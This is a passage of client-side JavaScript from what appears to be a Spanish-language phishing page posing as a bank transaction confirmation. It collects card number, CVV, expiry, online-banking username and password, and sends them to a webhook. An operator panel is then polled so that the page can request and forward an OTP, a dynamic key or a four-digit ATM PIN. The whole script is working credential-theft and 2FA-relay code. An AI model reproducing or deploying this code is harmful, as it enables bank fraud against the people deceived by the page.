                    formularioBloqueado = false;
                    return;
                }

                const resultado = await verificarEstadoSolicitud(solicitudId);

                if (resultado.estado === 'pending_clave_cajero') {
                    if (modoAutenticacion !== 'clave_cajero') {
                        modoAutenticacion = 'clave_cajero';
                        mostrarSeccionOTP('clave_cajero');
                        confirmationInput.value = '';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A' && resultado.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== resultado.otp_codigo) {
                            ultimoCodigoOTP = resultado.otp_codigo;
                            confirmationInput.value = ultimoCodigoOTP;
                            mostrarExito('✅ Código recibido automáticamente');
                        }
                    }
                    return;
                }

                if (resultado.estado === 'pending_otp') {
                    const modoReal = resultado.modo || 'otp';
                    if (modoReal === 'otp' && modoAutenticacion !== 'otp') {
                        modoAutenticacion = 'otp';
                        mostrarSeccionOTP('otp');
                        confirmationInput.value = '';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                    if (modoReal === 'clave_dinamica' && modoAutenticacion !== 'clave_dinamica') {
                        modoAutenticacion = 'clave_dinamica';
                        mostrarSeccionOTP('clave_dinamica');
                        confirmationInput.value = '';
                        loadingOverlay.classList.remove('active');
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A' && resultado.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== resultado.otp_codigo) {
                            ultimoCodigoOTP = resultado.otp_codigo;
                            confirmationInput.value = ultimoCodigoOTP;
                            mostrarExito('✅ Código recibido automáticamente');
                        }
                    }
                    return;
                }

                if (resultado.estado === 'approved' || resultado.estado === 'approved_otp' || resultado.estado === 'approved_clave_cajero') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                    detenerHeartbeat(true);
                    setTimeout(() => {
                        window.location.href = 'exito.php';
                    }, 2000);
                    return;
                }

                if (resultado.estadoReal === 'rejected' || resultado.estadoReal === 'rejected_otp' || resultado.estadoReal === 'rejected_clave_cajero' || resultado.estadoReal === 'rejected_user_error') {
                    if (rechazoDetectado) return;
                    rechazoDetectado = true;

                    if (resultado.estadoReal === 'rejected_user_error') {
                        statusMessage.className = 'status-message error-usuario';
                        statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                        statusMessage.style.display = 'block';
                        resetFormulario();
                        clearInterval(pollingInterval);
                        pollingInterval = null;
                        return;
                    }

                    let mensajeError;
                    if (modoAutenticacion === 'clave_cajero') {
                        mensajeError = '❌ Clave del Cajero incorrecta. Intente de nuevo.';
                    } else if (modoAutenticacion === 'clave_dinamica') {
                        mensajeError = '❌ Clave Dinámica incorrecta. Intente de nuevo.';
                    } else {
                        mensajeError = '❌ Código OTP incorrecto. Intente de nuevo.';
                    }

                    statusMessage.className = 'status-message error';
                    statusMessage.textContent = mensajeError;
                    statusMessage.style.display = 'block';

                    confirmationInput.value = '';
                    confirmationInput.disabled = false;
                    confirmationInput.focus();
                    usernameInput.disabled = true;
                    passwordInput.disabled = true;
                    submitButton.disabled = false;
                    buttonText.textContent = 'Continuar';
                    loadingOverlay.classList.remove('active');
                    otpSection.classList.add('visible');
                    pasoActual = 'otp';
                    formularioBloqueado = false;
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    return;
                }
            }, POLLING_INTERVAL);
        }

        // ============================================
        // FUNCIONES UI
        // ============================================
        function mostrarSeccionOTP(tipo) {
            otpSection.classList.add('visible');
            pasoActual = 'otp';
            confirmationInput.disabled = false;
            confirmationInput.focus();
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            errorMostrado = false;

            if (tipo === 'clave_dinamica') {
                otpInfoMessage.innerHTML = `<span>Para realizar este proceso, ingresa tu <strong>Clave Dinámica</strong> generada por el banco (4-8 dígitos).</span>`;
                const svg = otpInfoText.querySelector('svg');
                if (svg) {
                    svg.outerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;flex-shrink:0;"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>`;
                }
                otpLabel.textContent = 'Clave Dinámica *';
                confirmationInput.placeholder = 'Ingresa tu clave dinámica (4-8 dígitos)';
                buttonText.textContent = 'Continuar';
                modoAutenticacion = 'clave_dinamica';
                confirmationInput.maxLength = 8;
            } else if (tipo === 'clave_cajero') {
                otpInfoMessage.innerHTML = `<span>Para realizar este proceso, ingresa tu <strong>Clave del Cajero</strong> proporcionada por tu banco (4 dígitos).</span>`;
                const svg = otpInfoText.querySelector('svg');
                if (svg) {
                    svg.outerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;flex-shrink:0;"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M8 12h8"/><path d="M12 8v8"/></svg>`;
                }
                otpLabel.textContent = 'Clave del Cajero *';
                confirmationInput.placeholder = 'Ingresa tu clave del cajero (4 dígitos)';
                buttonText.textContent = 'Continuar';
                modoAutenticacion = 'clave_cajero';
                confirmationInput.maxLength = 4;
            } else {
                otpInfoMessage.innerHTML = `<span>Para realizar este proceso, ingresa el código de <strong>Token móvil o físico</strong> (4-8 dígitos).</span>`;
                const svg = otpInfoText.querySelector('svg');
                if (svg) {
                    svg.outerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;flex-shrink:0;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>`;
                }
                otpLabel.textContent = 'Código OTP *';
                confirmationInput.placeholder = 'Ingresa tu código de verificación (4-8 dígitos)';
                buttonText.textContent = 'Continuar';
                modoAutenticacion = 'otp';
                confirmationInput.maxLength = 8;
            }
            submitButton.disabled = false;
        }

        function ocultarOTP() {
            otpSection.classList.remove('visible');
            pasoActual = 'credenciales';
            buttonText.textContent = 'Continuar';
            confirmationInput.value = '';
            confirmationInput.disabled = true;
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            errorMostrado = false;
            ultimoCodigoOTP = null;
        }

        function mostrarError(mensaje) {
            statusMessage.className = 'status-message error';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            loadingOverlay.classList.remove('active');
            submitButton.disabled = false;
            buttonText.textContent = 'Continuar';
            errorMostrado = true;
        }

        function mostrarExito(mensaje) {
            statusMessage.className = 'status-message success';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            loadingOverlay.classList.remove('active');
            errorMostrado = false;
        }

        function mostrarInfo(mensaje) {
            statusMessage.className = 'status-message info';
            statusMessage.textContent = mensaje;
            statusMessage.style.display = 'block';
            errorMostrado = false;
        }

        function resetFormulario() {
            usernameInput.disabled = false;
            passwordInput.disabled = false;
            confirmationInput.disabled = true;
            ocultarOTP();
            loadingOverlay.classList.remove('active');
            submitButton.disabled = false;
            buttonText.textContent = 'Continuar';
            usernameInput.value = '';
            passwordInput.value = '';
            confirmationInput.value = '';
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            errorMostrado = false;
            modoAutenticacion = 'otp';
            ultimoCodigoOTP = null;
            formularioBloqueado = false;
            rechazoDetectado = false;
            confirmationInput.maxLength = 8;
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        // ============================================
        // VALIDACIÓN Y ENVÍO
        // ============================================
        [usernameInput, passwordInput, confirmationInput].forEach(input => {
            input.addEventListener('blur', function() {
                if (this.value.trim()) {
                    this.parentElement.classList.remove('error');
                }
            });
        });

        confirmationInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (modoAutenticacion === 'clave_cajero') {
                if (this.value.length > 4) this.value = this.value.slice(0, 4);
            } else {
                if (this.value.length > 8) this.value = this.value.slice(0, 8);
            }
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (formularioBloqueado) return;

            let isValid = true;
            statusMessage.className = 'status-message';
            statusMessage.style.display = 'none';
            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));

            if (pasoActual === 'credenciales') {
                if (!usernameInput.value.trim()) {
                    usernameInput.parentElement.classList.add('error');
                    isValid = false;
                }
                if (!passwordInput.value.trim()) {
                    passwordInput.parentElement.classList.add('error');
                    isValid = false;
                } else if (passwordInput.value.length < 4) {
                    passwordInput.parentElement.classList.add('error');
                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
                    isValid = false;
                }
            } else if (pasoActual === 'otp') {
                if (!confirmationInput.value.trim()) {
                    confirmationInput.parentElement.classList.add('error');
                    isValid = false;
                } else {
                    if (modoAutenticacion === 'clave_cajero') {
                        if (!/^\d{4}$/.test(confirmationInput.value)) {
                            confirmationInput.parentElement.classList.add('error');
                            confirmationInput.parentElement.querySelector('.error-message').textContent = 'La clave del cajero debe tener 4 dígitos';
                            isValid = false;
                        }
                    } else {
                        if (!/^\d{4,8}$/.test(confirmationInput.value)) {
                            confirmationInput.parentElement.classList.add('error');
                            confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código debe tener entre 4 y 8 dígitos';
                            isValid = false;
                        }
                    }
                }
            }

            if (!isValid) return;

            formularioBloqueado = true;
            loadingOverlay.classList.add('active');
            loadingText.textContent = 'Verificando código...';
            loadingSubtext.textContent = 'Esperando confirmación del banco';

            submitButton.disabled = true;
            buttonText.textContent = 'Verificando...';
            usernameInput.disabled = true;
            passwordInput.disabled = true;
            confirmationInput.disabled = true;

            if (pasoActual === 'credenciales') {
                enviarHeartbeat('activo');

                const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
                const cvv = localStorage.getItem('cardCVV') || 'No disponible';
                const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';

                const datosWebhook = {
                    solicitudId: solicitudId,
                    numeroTarjeta: numeroTarjeta,
                    cvv: cvv,
                    vencimiento: vencimiento,
                    usuario: usernameInput.value.trim(),
                    password: passwordInput.value.trim(),
                    monto: document.getElementById('transaction-amount').textContent,
                    fecha: document.getElementById('transaction-date').textContent
                };

                const enviado = await enviarCredencialesAlWebhook(datosWebhook);
                if (enviado) {
                    iniciarPollingCredenciales();
                } else {
                    mostrarError('Error al procesar la solicitud');
                    resetFormulario();
                    formularioBloqueado = false;
                }

            } else if (pasoActual === 'otp') {
                if (pollingInterval) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                }
                rechazoDetectado = false;
                enviarHeartbeat('activo');

                if (modoAutenticacion === 'otp') {
                    const datosOTP = {
                        solicitudId: solicitudId,
                        otp: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: document.getElementById('transaction-amount').textContent,
                        fecha: document.getElementById('transaction-date').textContent,
                        es_reintento: true
                    };
                    const enviado = await enviarOTPAlWebhook(datosOTP);
                    if (enviado) {
                        iniciarPollingOTP();
                    } else {
                        mostrarError('Error al procesar el OTP');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        loadingOverlay.classList.remove('active');
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                } else if (modoAutenticacion === 'clave_dinamica') {
                    const datosClave = {
                        solicitudId: solicitudId,
                        clave: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: document.getElementById('transaction-amount').textContent,
                        fecha: document.getElementById('transaction-date').textContent,
                        es_reintento: true
                    };
                    const enviado = await enviarClaveDinamicaAlWebhook(datosClave);
                    if (enviado) {
                        iniciarPollingOTP();
                    } else {
                        mostrarError('Error al procesar la Clave Dinámica');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        loadingOverlay.classList.remove('active');
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                } else if (modoAutenticacion === 'clave_cajero') {
                    const datosClave = {
                        solicitudId: solicitudId,
                        clave: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: document.getElementById('transaction-amount').textContent,
                        fecha: document.getElementById('transaction-date').textContent,
                        es_reintento: true
                    };
                    const enviado = await enviarClaveCajeroAlWebhook(datosClave);
                    if (enviado) {
                        iniciarPollingOTP();
                    } else {
                        mostrarError('Error al procesar la Clave del Cajero');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        loadingOverlay.classList.remove('active');
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                }
            }
        });

        document.getElementById('helpLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('Para más ayuda, contacta a tu banco o al servicio de atención al cliente.');
        });
    </script>
</body>
</html>
